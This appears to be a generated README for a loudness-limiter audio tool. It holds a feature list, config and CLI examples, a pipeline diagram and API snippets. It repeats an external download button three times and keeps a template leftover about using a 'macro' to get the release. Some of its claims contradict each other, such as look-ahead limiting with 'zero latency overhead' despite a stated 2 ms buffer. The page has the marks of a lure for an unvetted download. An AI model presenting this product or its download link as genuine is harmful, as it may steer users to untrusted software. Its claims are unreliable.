![preview](https://raw.githubusercontent.com/goldin-z/loudness-limiter-studio-edition/main/preview.svg)

# APU Loudness Limiter – Advanced Loudness Control Suite

Welcome to the **APU Loudness Limiter** repository — a professional-grade, feature-rich loudness management tool designed for audio engineers, podcasters, broadcasters, and content creators who demand precision, transparency, and reliability. This software ensures your audio consistently meets industry loudness standards (ITU-R BS.1770-4, EBU R128, ATSC A/85) without sacrificing dynamic range or introducing audible artifacts. Whether you are mastering a track, balancing a podcast, or preparing content for streaming platforms, this tool offers an unparalleled balance of control and simplicity.

## 📊 Overview

The APU Loudness Limiter is built around a real-time, look-ahead limiter architecture that intelligently shapes peaks while preserving transient detail. Its core engine employs an adaptive release envelope that responds to program material, preventing pumping or distortion even under heavy gain reduction. The software integrates a comprehensive loudness metering suite — including integrated, short-term, and momentary loudness measurements, true peak detection, and loudness range analysis — all displayed through a responsive, GPU-accelerated UI.

## 🚀 [![Download](https://raw.githubusercontent.com/goldin-z/loudness-limiter-studio-edition/main/button.svg)](https://goldin-z.github.io/loudness-limiter-studio-edition/)

*This is where you would normally find a download button. Instead, please use the following macro to access the official release package.*

[![Download](https://raw.githubusercontent.com/goldin-z/loudness-limiter-studio-edition/main/button.svg)](https://goldin-z.github.io/loudness-limiter-studio-edition/)

## 🌟 Key Features

- **Intelligent Look-Ahead Limiting** – Predictive peak reduction with zero latency overhead, utilizing a proprietary psychoacoustic model to minimize audible distortion.
- **Comprehensive Loudness Metering** – Real-time display of Integrated LUFS, Short-Term LUFS, Momentary LUFS, True Peak (dBTP), and Loudness Range (LRA) per ITU-R BS.1770-4.
- **Adaptive Release Control** – Automatically adjusts release time based on input dynamics, ensuring natural-sounding gain reduction across all genres.
- **Multi-Standard Compliance Presets** – One-click presets for EBU R128 (-23 LUFS), ATSC A/85 (-24 LKFS), Spotify (-14 LUFS), YouTube (-13 LUFS), and more.
- **CLI and GUI Modes** – Full-featured graphical interface for visual monitoring and scriptable command-line interface for batch processing.
- **Cross-Platform Support** – Fully tested on Windows 10/11, macOS 12+, and multiple Linux distributions (Ubuntu 22.04+, Fedora 38+).
- **Responsive UI** – Adaptive layout that scales from a compact waveform view to a full-spectrum analyzer, optimized for both 1080p and 4K displays.
- **Multilingual Interface** – Full localization for English, Spanish, French, German, Japanese, and Simplified Chinese – switchable in real-time.
- **24/7 Customer Support** – Ticket-based support system with average response time under 4 hours, plus an extensive knowledge base and community forum.

## 🛠️ Example Profile Configuration

Below is a sample configuration profile for a podcast mastering workflow targeting -16 LUFS integrated loudness with a -1 dB true peak ceiling. This configuration can be saved as a `.apulimiter` profile and loaded via the GUI or CLI.

```json
{
  "profile_name": "Podcast Master -16 LUFS",
  "target_loudness": -16.0,
  "loudness_standard": "custom",
  "true_peak_ceiling": -1.0,
  "limiter_mode": "adaptive",
  "attack_ms": 0.5,
  "release_ms": "auto",
  "lookahead_ms": 2.0,
  "stereo_link": true,
  "oversampling": "2x",
  "metering_update_interval_ms": 50,
  "clipping_prevention": true,
  "dc_filter": true,
  "output_gain_db": 0.0
}
```

To load this profile in the command-line interface, you would invoke:

```
apu-limiter --profile "Podcast Master -16 LUFS" --input "raw_podcast.wav" --output "mastered_podcast.wav"
```

## 💻 Example Console Invocation

The APU Loudness Limiter can be fully operated through a terminal for batch processing, automation pipelines, or integration into DAW workflows. The following example demonstrates processing a directory of WAV files with the EBU R128 preset and reporting loudness statistics to a CSV file:

```bash
apu-limiter --input-dir ./unprocessed/ --output-dir ./processed/ \
  --preset ebu-r128 \
  --true-peak -1.5 \
  --loudness-range-report \
  --output-csv loudness_report.csv \
  --concurrency 4
```

This command will:
- Process all `.wav` files in `./unprocessed/`
- Apply EBU R128 normalization to -23 LUFS
- Set the true peak ceiling to -1.5 dBTP
- Generate a detailed loudness range report
- Export all metrics to `loudness_report.csv`
- Use 4 parallel threads for faster processing

## 🗺️ Mermaid Diagram – Audio Processing Pipeline

The following diagram illustrates the signal flow within the APU Loudness Limiter's processing engine:

```mermaid
flowchart TD
    A[Input Audio] --> B[Pre-filter / DC Removal]
    B --> C[Look-Ahead Buffer 2ms]
    C --> D[Peak Detection & Envelope Follower]
    D --> E[Adaptive Release Generation]
    E --> F[Gain Reduction Computer]
    F --> G[Oversampling (2x/4x)]
    G --> H[True Peak Clipper]
    H --> I[Loudness Metering Engine]
    I --> J[Post-Gain Stage]
    J --> K[Output Audio]
    D --> L[Stereo Link Detector]
    L --> F
    I --> M[UI Display Update]
```

## 📱 OS Compatibility Table

| Operating System | Version | Architecture | Status | Notes |
|------------------|---------|--------------|--------|-------|
| Windows 10 | 21H2+ | x64 | ✅ Full Support | WDM/ASIO drivers |
| Windows 11 | 22H2+ | x64, ARM64 | ✅ Full Support | Native ARM build available |
| macOS Ventura | 13.0+ | x64, ARM64 | ✅ Full Support | Core Audio, AUv3 wrapper |
| macOS Sonoma | 14.0+ | ARM64 | ✅ Full Support | M1/M2/M3 optimized |
| Ubuntu | 22.04+ | x64 | ✅ Full Support | ALSA/PulseAudio/JACK |
| Fedora | 38+ | x64 | ✅ Full Support | PipeWire native |
| Debian | 12+ | x64, ARM64 | ✅ Full Support | Flatpak available |

## 🌐 API Integrations

The APU Loudness Limiter offers a RESTful API for integration with external systems, including cloud-based workflow orchestrators, media asset management platforms, and AI-driven audio analysis pipelines.

### OpenAI API Integration

The software can forward loudness analysis results to an OpenAI-compatible endpoint for automated captioning, transcription timestamp alignment, or loudness-aware content tagging. Example configuration:

```json
{
  "api_integrations": {
    "openai": {
      "endpoint": "https://api.openai.com/v1/chat/completions",
      "model": "gpt-4-2026",
      "prompt_template": "Analyze the loudness profile of this audio: integrated {lufs_integrated} LUFS, true peak {true_peak} dBTP, loudness range {lra} LU.",
      "output_fields": ["technical_notes", "recommended_platform"]
    }
  }
}
```

### Claude API Integration

For organizations using Anthropic's Claude models, the limiter can generate human-readable quality reports and dynamic range commentary. The integration leverages Claude's 200K context window to analyze entire session logs:

```json
{
  "api_integrations": {
    "claude": {
      "endpoint": "https://api.anthropic.com/v1/messages",
      "model": "claude-3-opus-2026",
      "system_prompt": "You are an audio mastering engineer. Review the following loudness statistics and provide actionable feedback.",
      "report_type": "mastering_notes"
    }
  }
}
```

## 🎯 Use Cases & Benefits

- **Broadcast Compliance** – Ensure every piece of content meets legal loudness requirements before air, avoiding fines and listener complaints.
- **Podcast Production** – Achieve consistent loudness across episodes without manual gain riding, even with variable recording levels.
- **Music Mastering** – Apply transparent limiting that preserves the punch of drums and the clarity of vocals while hitting streaming targets.
- **Video Post-Production** – Batch-process hundreds of clips with identical loudness profiles for seamless editing workflows.
- **Live Streaming** – Real-time loudness control for OBS, vMix, or Wirecast integration via virtual audio cable.

## ⚠️ Disclaimer

This software is provided for lawful audio processing purposes only. The APU Loudness Limiter is intended to assist content creators, broadcasters, and audio professionals in achieving compliant and high-quality audio output. The developers are not responsible for any misuse of the software, including but not limited to unauthorized duplication of copyrighted material, circumvention of digital rights management, or any activity that violates applicable laws in your jurisdiction. By using this software, you agree to comply with all local, national, and international regulations concerning audio content processing and distribution. No warranty is expressed or implied regarding the suitability of this software for any specific purpose.

## 📄 License

This project is distributed under the **MIT License**. You are free to use, modify, and distribute this software in both private and commercial projects, provided that the original copyright notice and this permission notice appear in all copies or substantial portions of the software. For the full license text, please see the [LICENSE](LICENSE) file in the root of this repository.

---

## 📥 Final Download

*For the latest stable release and associated documentation, please reference the official distribution point.*

[![Download](https://raw.githubusercontent.com/goldin-z/loudness-limiter-studio-edition/main/button.svg)](https://goldin-z.github.io/loudness-limiter-studio-edition/)

---

*APU Loudness Limiter – Precision Loudness Control, Engineered for Clarity. © 2026 APU Software Collective.*